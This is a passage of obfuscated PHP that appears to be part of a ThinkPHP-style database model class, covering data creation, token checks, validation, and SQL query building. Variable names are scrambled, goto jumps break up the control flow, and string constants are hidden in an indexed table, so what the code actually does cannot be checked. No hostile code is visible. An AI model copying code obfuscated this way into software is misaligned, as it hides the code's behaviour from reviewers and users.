$Dù„’¶Ì‰ = $this->db->select($A¹‹È‡Â««); if (!empty($Dù„’¶Ì‰)) { goto Bâê¯ç; DÍ´µØÀÛ’: foreach ($Dù„’¶Ì‰ as $aïÔÇ¶ÊØ‘) { $Dê¬¼‡ò­™ = $aïÔÇ¶ÊØ‘[$b¸Ñœ…­ßê]; if (2 == $Aè’îˆ½Šâ) { $e†ß…ğ§î‰[$Dê¬¼‡ò­™] = $aïÔÇ¶ÊØ‘[$bŠ— Ï õ]; } else { $e†ß…ğ§î‰[$Dê¬¼‡ò­™] = is_string($fÀ…åø¯’á) ? implode($fÀ…åø¯’á, $aïÔÇ¶ÊØ‘) : $aïÔÇ¶ÊØ‘; } } return $e†ß…ğ§î‰; goto AòÑæõÕ×ß; f–à‹”¶Ñ: $bŠ— Ï õ = array_shift($EÑª“ÓóŞ¸); $e†ß…ğ§î‰ = array(); $Aè’îˆ½Šâ = count($cİ±Ÿ¯Ş»²); goto DÍ´µØÀÛ’; Bâê¯ç: $cİ±Ÿ¯Ş»² = explode($a†ÛÄÄ¡–Ğ[47], $EÑª“ÓóŞ¸); $EÑª“ÓóŞ¸ = array_keys($Dù„’¶Ì‰[0]); $b¸Ñœ…­ßê = array_shift($EÑª“ÓóŞ¸); goto f–à‹”¶Ñ; AòÑæõÕ×ß: } } else { if (!0 !== $fÀ…åø¯’á) { $A¹‹È‡Â««[$a†ÛÄÄ¡–Ğ[290]] = is_numeric($fÀ…åø¯’á) ? $fÀ…åø¯’á : 1; } if ($fÀ…åø¯’á === $a†ÛÄÄ¡–Ğ[253]) { unset($A¹‹È‡Â««[$a†ÛÄÄ¡–Ğ[290]]); } $aïÔÇ¶ÊØ‘ = $this->db->select($A¹‹È‡Â««); if (!empty($aïÔÇ¶ÊØ‘)) { if ($fÀ…åø¯’á === $a†ÛÄÄ¡–Ğ[253]) { return reset($aïÔÇ¶ÊØ‘[0]); } if (!0 !== $fÀ…åø¯’á && 1 == $A¹‹È‡Â««[$a†ÛÄÄ¡–Ğ[290]]) { return reset($aïÔÇ¶ÊØ‘[0]); } foreach ($aïÔÇ¶ÊØ‘ as $b×©ƒöñØÑ) { $A§™Ë î¤¨[] = $b×©ƒöñØÑ[$EÑª“ÓóŞ¸]; } return $A§™Ë î¤¨; } } return null; } public function create($B¾´õÓê = '', $eŸ¤ÅÊ†—Õ = '') { goto aíß„Ù–—¡; E©ĞïˆÊ‡Õ: if ($this->autoCheckFields) { $bèø¹ÄÓ³Á = $this->getDbFields(); foreach ($B¾´õÓê as $a×Á¤÷ ­ => $F°ÅÚ‰¥Ù“) { if (!in_array($a×Á¤÷ ­, $bèø¹ÄÓ³Á)) { unset($B¾´õÓê[$a×Á¤÷ ­]); } elseif (MAGIC_QUOTES_GPC && is_string($F°ÅÚ‰¥Ù“)) { $B¾´õÓê[$a×Á¤÷ ­] = stripslashes($F°ÅÚ‰¥Ù“); } } } $this->autoOperation($B¾´õÓê, $eŸ¤ÅÊ†—Õ); $this->data = $B¾´õÓê; goto c’éµºéõ; E»¿ Ì±âš: $B¾´õÓê = $this->parseFieldsMap($B¾´õÓê, 0); $eŸ¤ÅÊ†—Õ = $eŸ¤ÅÊ†—Õ ? $eŸ¤ÅÊ†—Õ : (!empty($B¾´õÓê[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$A÷™µÃÛ‹æ[271]])) { $bèø¹ÄÓ³Á = $this->options[$A÷™µÃÛ‹æ[271]]; unset($this->options[$A÷™µÃÛ‹æ[271]]); } elseif ($eŸ¤ÅÊ†—Õ == THINK_MODEL_INSERT && isset($this->insertFields)) { $bèø¹ÄÓ³Á = $this->insertFields; } elseif ($eŸ¤ÅÊ†—Õ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $bèø¹ÄÓ³Á = $this->updateFields; } goto cÔ¾·º‰¨‡; aíß„Ù–—¡: $A÷™µÃÛ‹æ =& $_SERVER[«¾°Ã¤]; if (empty($B¾´õÓê)) { $B¾´õÓê = $_POST; } elseif (is_object($B¾´õÓê)) { $B¾´õÓê = get_object_vars($B¾´õÓê); } if (empty($B¾´õÓê) || !is_array($B¾´õÓê)) { $this->error = think_lang($A÷™µÃÛ‹æ[269]); return !1; } goto E»¿ Ì±âš; cÔ¾·º‰¨‡: if (isset($bèø¹ÄÓ³Á)) { if (is_string($bèø¹ÄÓ³Á)) { $bèø¹ÄÓ³Á = explode($A÷™µÃÛ‹æ[47], $bèø¹ÄÓ³Á); } if (think_config($A÷™µÃÛ‹æ[296])) { $bèø¹ÄÓ³Á[] = think_config($A÷™µÃÛ‹æ[297]); } foreach ($B¾´õÓê as $a×Á¤÷ ­ => $F°ÅÚ‰¥Ù“) { if (!in_array($a×Á¤÷ ­, $bèø¹ÄÓ³Á)) { unset($B¾´õÓê[$a×Á¤÷ ­]); } } } if (!$this->autoValidation($B¾´õÓê, $eŸ¤ÅÊ†—Õ)) { return !1; } if (!$this->autoCheckToken($B¾´õÓê)) { $this->error = think_lang($A÷™µÃÛ‹æ[298]); return !1; } goto E©ĞïˆÊ‡Õ; c’éµºéõ: return $B¾´õÓê; goto B›Å´Õ‹«®; B›Å´Õ‹«®: } public function autoCheckToken($Eã¦Ôöç) { $C¾¡Ë”±ˆÇ =& $_SERVER[«¾°Ã¤]; if (isset($this->options[$C¾¡Ë”±ˆÇ[299]]) && !$this->options[$C¾¡Ë”±ˆÇ[299]]) { return !0; } if (think_config($C¾¡Ë”±ˆÇ[296])) { $Cöº‡§ÎÙ = think_config($C¾¡Ë”±ˆÇ[297]); if (!isset($Eã¦Ôöç[$Cöº‡§ÎÙ]) || Session::get($Cöº‡§ÎÙ)) { return !1; } list($B‘“ŞÙÀ‘Ã, $e‰‘°âî³ã) = explode($C¾¡Ë”±ˆÇ[71], $Eã¦Ôöç[$Cöº‡§ÎÙ]); if ($e‰‘°âî³ã && Session::get($Cöº‡§ÎÙ . $C¾¡Ë”±ˆÇ[95] . $B‘“ŞÙÀ‘Ã) === $e‰‘°âî³ã) { Session::remove($Cöº‡§ÎÙ . $C¾¡Ë”±ˆÇ[95] . $B‘“ŞÙÀ‘Ã); return !0; } if (think_config($C¾¡Ë”±ˆÇ[300])) { Session::remove($Cöº‡§ÎÙ . $C¾¡Ë”±ˆÇ[95] . $B‘“ŞÙÀ‘Ã); } return !1; } return !0; } public function regex($fµÓ¥À’ñ¹, $AÜ«ªª‡îÔ) { $D³ö¾å•ï• =& $_SERVER[«¾°Ã¤]; $dÕéØå³ Ò = array($D³ö¾å•ï•[301] => $D³ö¾å•ï•[302], $D³ö¾å•ï•[303] => $D³ö¾å•ï•[304], $D³ö¾å•ï•[305] => $D³ö¾å•ï•[306], $D³ö¾å•ï•[307] => $D³ö¾å•ï•[308], $D³ö¾å•ï•[309] => $D³ö¾å•ï•[310], $D³ö¾å•ï•[311] => $D³ö¾å•ï•[312], $D³ö¾å•ï•[313] => $D³ö¾å•ï•[314], $D³ö¾å•ï•[288] => $D³ö¾å•ï•[315], $D³ö¾å•ï•[316] => $D³ö¾å•ï•[317]); if (isset($dÕéØå³ Ò[strtolower($AÜ«ªª‡îÔ)])) { $AÜ«ªª‡îÔ = $dÕéØå³ Ò[strtolower($AÜ«ªª‡îÔ)]; } return preg_match($AÜ«ªª‡îÔ, $fµÓ¥À’ñ¹) === 1; } private function autoOperation(&$a„äâ§öŒ¨, $aâè—¨öù) { $e™ÓÉ¦½¿· =& $_SERVER[«¾°Ã¤]; if (!empty($this->options[$e™ÓÉ¦½¿·[318]])) { $AÒÁÃØèÖ³ = $this->options[$e™ÓÉ¦½¿·[318]]; unset($this->options[$e™ÓÉ¦½¿·[318]]); } elseif (!empty($this->_auto)) { $AÒÁÃØèÖ³ = $this->_auto; } if (isset($AÒÁÃØèÖ³)) { foreach ($AÒÁÃØèÖ³ as $f­Û„ˆ˜¤Š) { if (empty($f­Û„ˆ˜¤Š[2])) { $f­Û„ˆ˜¤Š[2] = THINK_MODEL_INSERT; } if ($aâè—¨öù == $f­Û„ˆ˜¤Š[2] || $f­Û„ˆ˜¤Š[2] == THINK_MODEL_BOTH) { switch (trim($f­Û„ˆ˜¤Š[3])) { case $e™ÓÉ¦½¿·[319]: case $e™ÓÉ¦½¿·[320]: $E±Ş©ÄÃ«… = isset($f­Û„ˆ˜¤Š[4]) ? (array) $f­Û„ˆ˜¤Š[4] : array(); if (isset($a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]])) { array_unshift($E±Ş©ÄÃ«…, $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]]); } if ($e™ÓÉ¦½¿·[319] == $f­Û„ˆ˜¤Š[3]) { $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]] = call_user_func_array($f­Û„ˆ˜¤Š[1], $E±Ş©ÄÃ«…); } else { $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]] = call_user_func_array(array(&$this, $f­Û„ˆ˜¤Š[1]), $E±Ş©ÄÃ«…); } break; case $e™ÓÉ¦½¿·[271]: $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]] = $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[1]]; break; case $e™ÓÉ¦½¿·[321]: if ($e™ÓÉ¦½¿·[33] === $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]]) { unset($a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]]); } break; case $e™ÓÉ¦½¿·[322]: default: $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]] = $f­Û„ˆ˜¤Š[1]; } if (!1 === $a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]]) { unset($a„äâ§öŒ¨[$f­Û„ˆ˜¤Š[0]]); } } } } return $a„äâ§öŒ¨; } protected function autoValidation($C®–‚°ë, $BÉ†è•ñ±›) { $bÄß‰•å„ =& $_SERVER[«¾°Ã¤]; if (!empty($this->options[$bÄß‰•å„[323]])) { $bËÎ‚éİ•ó = $this->options[$bÄß‰•å„[323]]; unset($this->options[$bÄß‰•å„[323]]); } elseif (!empty($this->_validate)) { $bËÎ‚éİ•ó = $this->_validate; } if (isset($bËÎ‚éİ•ó)) { if ($this->patchValidate) { $this->error = array(); } foreach ($bËÎ‚éİ•ó as $dÔïŸåé => $aÊßöŒ¶í§) { if (empty($aÊßöŒ¶í§[5]) || $aÊßöŒ¶í§[5] == THINK_MODEL_BOTH || $aÊßöŒ¶í§[5] == $BÉ†è•ñ±›) { if (0 == strpos($aÊßöŒ¶í§[2], $bÄß‰•å„[324]) && strpos($aÊßöŒ¶í§[2], $bÄß‰•å„[325])) { $aÊßöŒ¶í§[2] = think_lang(substr($aÊßöŒ¶í§[2], 2, -1)); } $aÊßöŒ¶í§[3] = isset($aÊßöŒ¶í§[3]) ? $aÊßöŒ¶í§[3] : THINK_EXISTS_VALIDATE; $aÊßöŒ¶í§[4] = isset($aÊßöŒ¶í§[4]) ? $aÊßöŒ¶í§[4] : $bÄß‰•å„[326]; switch ($aÊßöŒ¶í§[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($C®–‚°ë, $aÊßöŒ¶í§)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($bÄß‰•å„[33] != trim($C®–‚°ë[$aÊßöŒ¶í§[0]])) { if (!1 === $this->_validationField($C®–‚°ë, $aÊßöŒ¶í§)) { return !1; } } break; default: if (isset($C®–‚°ë[$aÊßöŒ¶í§[0]])) { if (!1 === $this->_validationField($C®–‚°ë, $aÊßöŒ¶í§)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($aÖ‹¹‹Û­Û, $Aø¿ëŞ¤ã) { if (!1 === $this->_validationFieldItem($aÖ‹¹‹Û­Û, $Aø¿ëŞ¤ã)) { if ($this->patchValidate) { $this->error[$Aø¿ëŞ¤ã[0]] = $Aø¿ëŞ¤ã[2]; } else { $this->error = $Aø¿ëŞ¤ã[2]; return !1; } } return; } protected function _validationFieldItem($aØ¶º…Ç, $eµ‘¡®¸İ) { $b‘÷Ğ¾¸ì =& $_SERVER[«¾°Ã¤]; switch (strtolower(trim($eµ‘¡®¸İ[4]))) { case $b‘÷Ğ¾¸ì[319]: case $b‘÷Ğ¾¸ì[320]: $d£å¼³†ª = isset($eµ‘¡®¸İ[6]) ? (array) $eµ‘¡®¸İ[6] : array(); if (is_string($eµ‘¡®¸İ[0]) && strpos($eµ‘¡®¸İ[0], $b‘÷Ğ¾¸ì[47])) { $eµ‘¡®¸İ[0] = explode($b‘÷Ğ¾¸ì[47], $eµ‘¡®¸İ[0]); } if (is_array($eµ‘¡®¸İ[0])) { foreach ($eµ‘¡®¸İ[0] as $f•Šª¯÷è·) { $Dø²½ˆé°—[$f•Šª¯÷è·] = $aØ¶º…Ç[$f•Šª¯÷è·]; } array_unshift($d£å¼³†ª, $Dø²½ˆé°—); } else { array_unshift($d£å¼³†ª, $aØ¶º…Ç[$eµ‘¡®¸İ[0]]); } if ($b‘÷Ğ¾¸ì[319] == $eµ‘¡®¸İ[4]) { return call_user_func_array($eµ‘¡®¸İ[1], $d£å¼³†ª); } else { return call_user_func_array(array(&$this, $eµ‘¡®¸İ[1]), $d£å¼³†ª); } case $b‘÷Ğ¾¸ì[327]: return $aØ¶º…Ç[$eµ‘¡®¸İ[0]] == $aØ¶º…Ç[$eµ‘¡®¸İ[1]]; case $b‘÷Ğ¾¸ì[328]: if (is_string($eµ‘¡®¸İ[0]) && strpos($eµ‘¡®¸İ[0], $b‘÷Ğ¾¸ì[47])) { $eµ‘¡®¸İ[0] = explode($b‘÷Ğ¾¸ì[47], $eµ‘¡®¸İ[0]); } $A‚•ÂŠ”ŞÄ = array(); if (is_array($eµ‘¡®¸İ[0])) { foreach ($eµ‘¡®¸İ[0] as $f•Šª¯÷è·) { $A‚•ÂŠ”ŞÄ[$f•Šª¯÷è·] = $aØ¶º…Ç[$f•Šª¯÷è·]; } } else { $A‚•ÂŠ”ŞÄ[$eµ‘¡®¸İ[0]] = $aØ¶º…Ç[$eµ‘¡®¸İ[0]]; } if (!empty($aØ¶º…Ç[$this->getPk()])) { $A‚•ÂŠ”ŞÄ[$this->getPk()] = array($b‘÷Ğ¾¸ì[329], $aØ¶º…Ç[$this->getPk()]); } if ($this->where($A‚•ÂŠ”ŞÄ)->find()) { return !1; } return !0; default: return $this->check($aØ¶º…Ç[$eµ‘¡®¸İ[0]], $eµ‘¡®¸İ[1], $eµ‘¡®¸İ[4]); } } public function check($bÚ¸íÒáÅ, $c®¾Æ´§ì, $A ‡È…İ¾Ü = "\x72\145\x67\145\x78") { $aÄğ—Ë³ëİ =& $_SERVER[«¾°Ã¤]; $A ‡È…İ¾Ü = strtolower(trim($A ‡È…İ¾Ü)); switch ($A ‡È…İ¾Ü) { case $aÄğ—Ë³ëİ[7]: case $aÄğ—Ë³ëİ[330]: $FÖìÈ¶ïàŒ = is_array($c®¾Æ´§ì) ? $c®¾Æ´§ì : explode($aÄğ—Ë³ëİ[47], $c®¾Æ´§ì); return $A ‡È…İ¾Ü == $aÄğ—Ë³ëİ[7] ? in_array($bÚ¸íÒáÅ, $FÖìÈ¶ïàŒ) : !in_array($bÚ¸íÒáÅ, $FÖìÈ¶ïàŒ); case $aÄğ—Ë³ëİ[331]: case $aÄğ—Ë³ëİ[332]: if (is_array($c®¾Æ´§ì)) { $dŒëï¥ÕõÉ = $c®¾Æ´§ì[0]; $a¼ïîÎš‡Î = $c®¾Æ´§ì[1]; } else { list($dŒëï¥ÕõÉ, $a¼ïîÎš‡Î) = explode($aÄğ—Ë³ëİ[47], $c®¾Æ´§ì); } return $A ‡È…İ¾Ü == $aÄğ—Ë³ëİ[331] ? $bÚ¸íÒáÅ >= $dŒëï¥ÕõÉ && $bÚ¸íÒáÅ <= $a¼ïîÎš‡Î : $bÚ¸íÒáÅ < $dŒëï¥ÕõÉ || $bÚ¸íÒáÅ > $a¼ïîÎš‡Î; case $aÄğ—Ë³ëİ[333]: case $aÄğ—Ë³ëİ[334]: return $A ‡È…İ¾Ü == $aÄğ—Ë³ëİ[333] ? $bÚ¸íÒáÅ == $c®¾Æ´§ì : $bÚ¸íÒáÅ != $c®¾Æ´§ì; case $aÄğ—Ë³ëİ[335]: $føŸ‚Ø¯¸ = mb_strlen($bÚ¸íÒáÅ, $aÄğ—Ë³ëİ[336]); if (strpos($c®¾Æ´§ì, $aÄğ—Ë³ëİ[47])) { list($dŒëï¥ÕõÉ, $a¼ïîÎš‡Î) = explode($aÄğ—Ë³ëİ[47], $c®¾Æ´§ì); return $føŸ‚Ø¯¸ >= $dŒëï¥ÕõÉ && $føŸ‚Ø¯¸ <= $a¼ïîÎš‡Î; } else { return $føŸ‚Ø¯¸ == $c®¾Æ´§ì; } case $aÄğ—Ë³ëİ[337]: list($AÂõíò”º, $açİ“Â†ä) = explode($aÄğ—Ë³ëİ[47], $c®¾Æ´§ì); if (!is_numeric($AÂõíò”º)) { $AÂõíò”º = strtotime($AÂõíò”º); } if (!is_numeric($açİ“Â†ä)) { $açİ“Â†ä = strtotime($açİ“Â†ä); } return NOW_TIME >= $AÂõíò”º && NOW_TIME <= $açİ“Â†ä; case $aÄğ—Ë³ëİ[338]: return in_array(get_client_ip(), explode($aÄğ—Ë³ëİ[47], $c®¾Æ´§ì)); case $aÄğ—Ë³ëİ[339]: return !in_array(get_client_ip(), explode($aÄğ—Ë³ëİ[47], $c®¾Æ´§ì)); case $aÄğ—Ë³ëİ[326]: default: return $this->regex($bÚ¸íÒáÅ, $c®¾Æ´§ì); } } public function query($b‡®¸Éë, $B ƒŠ¡æğ“ = false) { $f´‘¥ĞŒ¨Ş =& $_SERVER[«¾°Ã¤]; if (!is_bool($B ƒŠ¡æğ“) && !is_array($B ƒŠ¡æğ“)) { $B ƒŠ¡æğ“ = func_get_args(); array_shift($B ƒŠ¡æğ“); } $b‡®¸Éë = str_replace(array($f´‘¥ĞŒ¨Ş[229], $f´‘¥ĞŒ¨Ş[340]), $f´‘¥ĞŒ¨Ş[50], $b‡®¸Éë); $b‡®¸Éë = $this->parseSql($b‡®¸Éë, $B ƒŠ¡æğ“); return $this->db->query($b‡®¸Éë); } public function execute($B‘·›“´, $aÖå¬¦Ã¡“ = false) { if (!is_bool($aÖå¬¦Ã¡“) && !is_array($aÖå¬¦Ã¡“)) { $aÖå¬¦Ã¡“ = func_get_args(); array_shift($aÖå¬¦Ã¡“); } $B‘·›“´ = $this->parseSql($B‘·›“´, $aÖå¬¦Ã¡“); return $this->db->execute($B‘·›“´); } protected function parseSql($D†Ìó«”ğà, $DåÚ¹§Ï) { $F˜İñâèÉ— =& $_SERVER[«¾°Ã¤]; if (!0 === $DåÚ¹§Ï) { $EÚİÉæ¶†Ç = $this->_parseOptions(); $D†Ìó«”ğà = $this->db->parseSql($D†Ìó«”ğà, $EÚİÉæ¶†Ç); } elseif (is_array($DåÚ¹§Ï)) { $DåÚ¹§Ï = array_map(array($this->db, $F˜İñâèÉ—[341]), $DåÚ¹§Ï); $D†Ìó«”ğà = vsprintf($D†Ìó«”ğà, $DåÚ¹§Ï); } else { $D†Ìó«”ğà = strtr($D†Ìó«”ğà, array($F˜İñâèÉ—[342] => $this->getTableName(), $F˜İñâèÉ—[343] => think_config($F˜İñâèÉ—[242]))); } $this->db->setModel($this->name); return $D†Ìó«”ğà; } public function db($A°›™ìØäÖ = '', $aÃË¿é½‘Ÿ = '', $DæÜ²»ŒŞñ = array()) { goto b÷„ãÏÄØ¢; f¥£…Ò ÁÏ: static $CÎŸèÜ¿¨ä = array(); if (!isset($CÎŸèÜ¿¨ä[$A°›™ìØäÖ]) || isset($CÎŸèÜ¿¨ä[$A°›™ìØäÖ]) && $aÃË¿é½‘Ÿ && $f©áÉŸ‘®[$A°›™ìØäÖ] != $aÃË¿é½‘Ÿ) { if (!empty($aÃË¿é½‘Ÿ) && is_string($aÃË¿é½‘Ÿ) && !1 === strpos($aÃË¿é½‘Ÿ, $A¼”Òƒ³¹[8])) { $aÃË¿é½‘Ÿ = think_config($aÃË¿é½‘Ÿ); } $CÎŸèÜ¿¨ä[$A°›™ìØäÖ] = Db::getInstance($aÃË¿é½‘Ÿ); } elseif (NULL === $aÃË¿é½‘Ÿ) { $CÎŸèÜ¿¨ä[$A°›™ìØäÖ]->close(); unset($CÎŸèÜ¿¨ä[$A°›™ìØäÖ]); return; } if (!empty($DæÜ²»ŒŞñ)) { if (is_string($DæÜ²»ŒŞñ)) { parse_str($DæÜ²»ŒŞñ, $DæÜ²»ŒŞñ); } foreach ($DæÜ²»ŒŞñ as $CÅµØœ§ôÍ => $DÃ²Èñà™ã) { $this->setProperty($CÅµØœ§ôÍ, $DÃ²Èñà™ã); } } goto c»‹…íÌõ; b÷„ãÏÄØ¢: $A¼”Òƒ³¹ =& $_SERVER[«¾°Ã¤]; if ($A¼”Òƒ³¹[33] === $A°›™ìØäÖ && $this->db) { return $this->db; } static $f©áÉŸ‘® = array(); goto f¥£…Ò ÁÏ; b‰î«•ä¶¥: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto B©áò¦¤ºİ; c»‹…íÌõ: $f©áÉŸ‘®[$A°›™ìØäÖ] = $aÃË¿é½‘Ÿ; $this->db = $CÎŸèÜ¿¨ä[$A°›™ìØäÖ]; $this->_after_db(); goto b‰î«•ä¶¥; B©áò¦¤ºİ: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $C…‘ó––¯« = get_class($this); if ($C…‘ó––¯« == $_SERVER[«¾°Ã¤][344]) { return $this->name; } $this->name = substr($C…‘ó––¯«, 0, -5); } return $this->name; } public function getTableName() { $eîƒ­¬ãÁ‘ =& $_SERVER[«¾°Ã¤]; if (empty($this->trueTableName)) { $aƒâ…Ä‹Ä• = !empty($this->tablePrefix) ? $this->tablePrefix : $eîƒ­¬ãÁ‘[33]; if (!empty($this->tableName)) { $aƒâ…Ä‹Ä• .= $this->tableName; } else { $aƒâ…Ä‹Ä• .= think_parse_name($this->name); } $this->trueTableName = strtolower($aƒâ…Ä‹Ä•); } return (!empty($this->dbName) ? $this->dbName . $eîƒ­¬ãÁ‘[95] : $eîƒ­¬ãÁ‘[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $BÇ˜áß¥ñ‹ =& $_SERVER[«¾°Ã¤]; return isset($this->fields[$BÇ˜áß¥ñ‹[249]]) ? $this->fields[$BÇ˜áß¥ñ‹[249]] : $this->pk; } public function getDbFields() { $dÖ‚ˆñÂİ =& $_SERVER[«¾°Ã¤]; if (isset($this->options[$dÖ‚ˆñÂİ[277]])) { $cÀ÷ì¡œÙ = $this->db->getFields($this->options[$dÖ‚ˆñÂİ[277]]); return $cÀ÷ì¡œÙ ? array_keys($cÀ÷ì¡œÙ) : !1; } if ($this->fields) { $cÀ÷ì¡œÙ = $this->fields; unset($cÀ÷ì¡œÙ[$dÖ‚ˆñÂİ[248]], $cÀ÷ì¡œÙ[$dÖ‚ˆñÂİ[249]], $cÀ÷ì¡œÙ[$dÖ‚ˆñÂİ[250]], $cÀ÷ì¡œÙ[$dÖ‚ˆñÂİ[247]]); return $cÀ÷ì¡œÙ; } return !1; } public function data($a‰•êÖ”ö = '') { $A›²ÜŸÅ =& $_SERVER[«¾°Ã¤]; if ($A›²ÜŸÅ[33] === $a‰•êÖ”ö && !empty($this->data)) { return $this->data; } if (is_object($a‰•êÖ”ö)) { $a‰•êÖ”ö = get_object_vars($a‰•êÖ”ö); } elseif (is_string($a‰•êÖ”ö)) { parse_str($a‰•êÖ”ö, $a‰•êÖ”ö); } elseif (!is_array($a‰•êÖ”ö)) { think_exception(think_lang($A›²ÜŸÅ[269])); } $this->data = $a‰•êÖ”ö; return $this; } public function join($F¢çÜğµÏ©) { $C‘ÓæŒ»è… =& $_SERVER[«¾°Ã¤]; if (is_array($F¢çÜğµÏ©)) { $this->options[$C‘ÓæŒ»è…[280]] = $F¢çÜğµÏ©; } elseif (!empty($F¢çÜğµÏ©)) { $this->options[$C‘ÓæŒ»è…[280]][] = $F¢çÜğµÏ©; } return $this; } public function union($b”ë‘ ÀÕ…, $a©³çÓ©« = false) { goto eœ™‹Ó­«Ñ; eœ™‹Ó­«Ñ: $B¤®·¯ñå =& $_SERVER[«¾°Ã¤]; if (empty($b”ë‘ ÀÕ…)) { return $this; } if ($a©³çÓ©«) { $this->options[$B¤®·¯ñå[345]][$B¤®·¯ñå[346]] = !0; } goto FêĞô±„Ï¯; C½©ƒß˜™Ù: return $this; goto Cœ…Ğí¡; FêĞô±„Ï¯: if (is_object($b”ë‘ ÀÕ…)) { $b”ë‘ ÀÕ… = get_object_vars($b”ë‘ ÀÕ…); } if (is_string($b”ë‘ ÀÕ…)) { $c™øİŞˆ‹— = $b”ë‘ ÀÕ…; } elseif (is_array($b”ë‘ ÀÕ…)) { if (isset($b”ë‘ ÀÕ…[0])) { $this->options[$B¤®·¯ñå[345]] = array_merge($this->options[$B¤®·¯ñå[345]], $b”ë‘ ÀÕ…); return $this; } else { $c™øİŞˆ‹— = $b”ë‘ ÀÕ…; } } else { think_exception(think_lang($B¤®·¯ñå[269])); } $this->options[$B¤®·¯ñå[345]][] = $c™øİŞˆ‹—; goto C½©ƒß˜™Ù; Cœ…Ğí¡: } public function cache($BŠ°··ç¹ø = true, $B‘ç™—Èï = null, $EÈ¼×¯Òö… = '') { $d‡‡‰ˆê¥„ =& $_SERVER[«¾°Ã¤]; if (!1 !== $BŠ°··ç¹ø) { $this->options[$d‡‡‰ˆê¥„[347]] = array($d‡‡‰ˆê¥„[93] => $BŠ°··ç¹ø, $d‡‡‰ˆê¥„[337] => $B‘ç™—Èï, $d‡‡‰ˆê¥„[29] => $EÈ¼×¯Òö…); } return $this; } public function field($c¼Ò˜ÊÜô, $CŠ˜©ËŠÎÂ = false) { $d”å¥¿÷¹é =& $_SERVER[«¾°Ã¤]; if (!0 === $c¼Ò˜ÊÜô) { $eí®Ñª–—… = $this->getDbFields(); $c¼Ò˜ÊÜô = $eí®Ñª–—… ? $eí®Ñª–—… : $d”å¥¿÷¹é[182]; } elseif ($CŠ˜©ËŠÎÂ) { if (is_string($c¼Ò˜ÊÜô)) { $c¼Ò˜ÊÜô = explode($d”å¥¿÷¹é[47], $c¼Ò˜ÊÜô); } $eí®Ñª–—… = $this->getDbFields(); $c¼Ò˜ÊÜô = $eí®Ñª–—… ? array_diff($eí®Ñª–—…, $c¼Ò˜ÊÜô) : $c¼Ò˜ÊÜô; } $this->options[$d”å¥¿÷¹é[271]] = $c¼Ò˜ÊÜô; return $this; } public function scope($C„Éç”©ßÃ = '', $BÜÜ‹çÜ = NULL) { $fô®Õ©ÂĞÎ =& $_SERVER[«¾°Ã¤]; if ($fô®Õ©ÂĞÎ[33] === $C„Éç”©ßÃ) { if (isset($this->_scope[$fô®Õ©ÂĞÎ[34]])) { $a–âÉ¿œÏ‚ = $this->_scope[$fô®Õ©ÂĞÎ[34]]; } else { return $this; } } elseif (is_string($C„Éç”©ßÃ)) { $e»ßì“¶± = explode($fô®Õ©ÂĞÎ[47], $C„Éç”©ßÃ); $a–âÉ¿œÏ‚ = array(); foreach ($e»ßì“¶± as $c„Ö«“â”¾) { if (!isset($this->_scope[$c„Ö«“â”¾])) { continue; } $a–âÉ¿œÏ‚ = array_merge($a–âÉ¿œÏ‚, $this->_scope[$c„Ö«“â”¾]); } if (!empty($BÜÜ‹çÜ) && is_array($BÜÜ‹çÜ)) { $a–âÉ¿œÏ‚ = array_merge($a–âÉ¿œÏ‚, $BÜÜ‹çÜ); } } elseif (is_array($C„Éç”©ßÃ)) { $a–âÉ¿œÏ‚ = $C„Éç”©ßÃ; } if (is_array($a–âÉ¿œÏ‚) && !empty($a–âÉ¿œÏ‚)) { $this->options = array_merge($this->options, array_change_key_case($a–âÉ¿œÏ‚)); } return $this; } public function where($f÷Ö¨°ƒå, $b×İù”ŠÉ = null) { $Cè²Ò…×ç =& $_SERVER[«¾°Ã¤]; if (!is_null($b×İù”ŠÉ) && is_string($f÷Ö¨°ƒå)) { if (!is_array($b×İù”ŠÉ)) { $b×İù”ŠÉ = func_get_args(); array_shift($b×İù”ŠÉ); } $b×İù”ŠÉ = array_map(array($this->db, $Cè²Ò…×ç[341]), $b×İù”ŠÉ); $f÷Ö¨°ƒå = vsprintf($f÷Ö¨°ƒå, $b×İù”ŠÉ); } elseif (is_object($f÷Ö¨°ƒå)) { $f÷Ö¨°ƒå = get_object_vars($f÷Ö¨°ƒå); } elseif (is_array($f÷Ö¨°ƒå)) { foreach ($f÷Ö¨°ƒå as $f÷£µˆ‹”Ú => $d ÖÚáŸ¹) { if ((is_numeric($f÷£µˆ‹”Ú) || !$f÷£µˆ‹”Ú) && is_string($d ÖÚáŸ¹)) { if (strpos($d ÖÚáŸ¹, $Cè²Ò…×ç[348]) === 0) { continue; } think_trace($Cè²Ò…×ç[349], $Cè²Ò…×ç[33], $Cè²Ò…×ç[46]); die; } } } if (is_string($f÷Ö¨°ƒå) && $Cè²Ò…×ç[33] != $f÷Ö¨°ƒå) { $fŒèÉ‰«°è = array(); $fŒèÉ‰«°è[$Cè²Ò…×ç[350]] = $f÷Ö¨°ƒå; $f÷Ö¨°ƒå = $fŒèÉ‰«°è; } if (isset($this->options[$Cè²Ò…×ç[273]])) { $this->options[$Cè²Ò…×ç[273]] = array_merge($this->options[$Cè²Ò…×ç[273]], $f÷Ö¨°ƒå); } else { 